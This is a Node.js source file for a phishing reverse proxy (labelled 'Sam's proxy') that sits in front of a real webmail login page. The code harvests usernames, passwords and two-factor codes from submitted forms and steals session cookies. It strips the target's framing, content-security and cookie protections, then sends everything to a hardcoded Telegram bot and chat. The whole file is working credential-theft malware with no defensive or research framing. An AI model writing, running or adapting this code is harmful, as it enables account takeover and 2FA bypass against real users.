const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');

// ============================================
// CONFIGURATION
// ============================================

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g';
const CHAT_ID = process.env.CHAT_ID || '7837944828';
const TARGET_URL = process.env.TARGET_URL || 'https://accounts.freemail.hu';
const PORT = process.env.PORT || 10000;

const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
const app = express();

// Storage for multi-stage capture
const sessions = new Map();

// ============================================
// HELPER FUNCTIONS
// ============================================

function getClientId(req) {
  return req.ip + (req.headers['user-agent'] || '');
}

function getSession(req) {
  const id = getClientId(req);
  if (!sessions.has(id)) {
    sessions.set(id, {
      username: null,
      password: null,
      twofaCode: null,
      sessionToken: null,
      stage: 0,
      startTime: new Date().toISOString()
    });
  }
  return sessions.get(id);
}

function sendToTelegram(data) {
  const message = `🎉 *CAPTURE COMPLETE!*\n\n` +
    `👤 *Username:* \`${data.username || 'N/A'}\`\n` +
    `🔑 *Password:* \`${data.password || 'N/A'}\`\n` +
    `🔢 *2FA:* \`${data.twofaCode || 'N/A'}\`\n\n` +
    `🍪 *Session:* \`\`\`${data.sessionToken || 'N/A'}\`\`\`\n\n` +
    `⏰ *Time:* ${new Date().toLocaleString()}`;

  bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
    .then(() => console.log('📱 Sent to Telegram'))
    .catch(err => console.error('Telegram error:', err.message));
}

// ============================================
// MIDDLEWARE - CAPTURE REQUESTS
// ============================================

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Capture requests
app.use((req, res, next) => {
  const session = getSession(req);
  
  if (req.method === 'POST' && req.body) {
    const body = req.body;
    
    const userFields = ['username', 'email', 'user', 'login', 'id', 'account', 'identifier'];
    const passFields = ['password', 'passwd', 'pass', 'pwd', 'secret'];
    const codeFields = ['code', 'otp', 'twofa', '2fa', 'verificationCode', 'token', 'pin'];
    
    for (let field of userFields) {
      if (body[field]) {
        session.username = body[field];
        session.stage = Math.max(session.stage, 1);
        console.log('✅ Captured username');
        break;
      }
    }
    
    for (let field of passFields) {
      if (body[field]) {
        session.password = body[field];
        session.stage = Math.max(session.stage, 2);
        console.log('✅ Captured password');
        break;
      }
    }
    
    for (let field of codeFields) {
      if (body[field]) {
        session.twofaCode = body[field];
        session.stage = Math.max(session.stage, 3);
        console.log('✅ Captured 2FA');
        break;
      }
    }
  }
  
  next();
});

// ============================================
// PROXY CONFIGURATION
// ============================================

const proxy = createProxyMiddleware({
  target: TARGET_URL,
  changeOrigin: true,
  secure: false,
  ws: true,
  
  // Don't follow redirects automatically - let browser handle them
  followRedirects: false,
  
  cookieDomainRewrite: {
    '*': ''
  },
  
  onProxyReq: (proxyReq, req, res) => {
    try {
      // Only set headers if not already sent
      if (!proxyReq.headersSent) {
        proxyReq.setHeader('Referer', TARGET_URL);
        proxyReq.setHeader('Origin', TARGET_URL);
      }
      console.log('➡️  Proxying:', req.url);
    } catch (e) {
      console.log('Header already sent, skipping');
    }
  },
  
  onProxyRes: (proxyRes, req, res) => {
    const session = getSession(req);
    
    // Remove security headers
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['content-security-policy-report-only'];
    
    // Fix cookies
    if (proxyRes.headers['set-cookie']) {
      const cookies = proxyRes.headers['set-cookie'];
      
      proxyRes.headers['set-cookie'] = cookies.map(cookie => {
        return cookie
          .replace(/Domain=[^;]+;?/gi, '')
          .replace(/SameSite=[^;]+;?/gi, '')
          .replace(/Secure;?/gi, '');
      });
      
      // Look for session tokens
      const sessionCookie = cookies.find(c => 
        c.toLowerCase().includes('session') || 
        c.toLowerCase().includes('auth') ||
        c.toLowerCase().includes('token') ||
        c.length > 40
      );
      
      if (sessionCookie && session.username && session.stage >= 2) {
        session.sessionToken = sessionCookie;
        session.stage = 4;
        
        console.log('🎉 COMPLETE CAPTURE!');
        sendToTelegram(session);
        
        setTimeout(() => sessions.delete(getClientId(req)), 30000);
      }
    }
  },
  
  onError: (err, req, res) => {
    console.error('❌ Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(502).send('Proxy error');
    }
  }
});

// ============================================
// ROUTES
// ============================================

app.get('/health', (req, res) => {
  res.json({status: 'Sam is running', activeSessions: sessions.size});
});

app.use('/', proxy);

// ============================================
// SERVER START
// ============================================

const server = http.createServer(app);

server.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════╗
║   🎭 SAM'S PROXY RUNNING                      ║
║   Port: ${PORT}                               ║
║   Target: ${TARGET_URL}          ║
╚════════════════════════════════════════════════╝
  `);
});
